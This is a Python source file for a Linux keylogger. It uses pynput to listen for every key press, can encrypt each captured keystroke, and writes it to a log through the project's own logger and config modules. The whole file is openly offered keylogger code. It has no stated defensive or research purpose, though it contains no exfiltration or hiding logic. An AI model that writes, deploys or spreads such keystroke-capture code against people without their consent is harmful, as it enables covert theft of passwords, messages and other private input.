import logging
from pynput import keyboard
from core.logger import Keylogger
from core.data_handler import DataHandler
from config.loader import ConfigLoader

class LinuxKeylogger(Keylogger):
    def __init__(self):
        super().__init__()
        self.logger = logging.getLogger("LinuxKeylogger")
        config = ConfigLoader.load_config()
        self.data_handler = DataHandler()
        
        # Enable encryption if configured
        if config["encryption"]["enabled"]:
            self.data_handler.enable_encryption()

    def _on_key_press(self, key):
        try:
            # Capture key name or character
            key_data = key.char if hasattr(key, 'char') else str(key)
            
            # Log encrypted or plaintext keystrokes
            if ConfigLoader.get("encryption.enabled", False):
                key_data = self.data_handler.encrypt_data(key_data)
            self.logger.info(f"Keystroke: {key_data}")
        except Exception as e:
            self.logger.error(f"Error capturing keystroke: {e}")

    def start_logging(self):
        with keyboard.Listener(on_press=self._on_key_press) as listener:
            listener.join()

if __name__ == "__main__":
    logger = LinuxKeylogger()
    logger.start_logging()
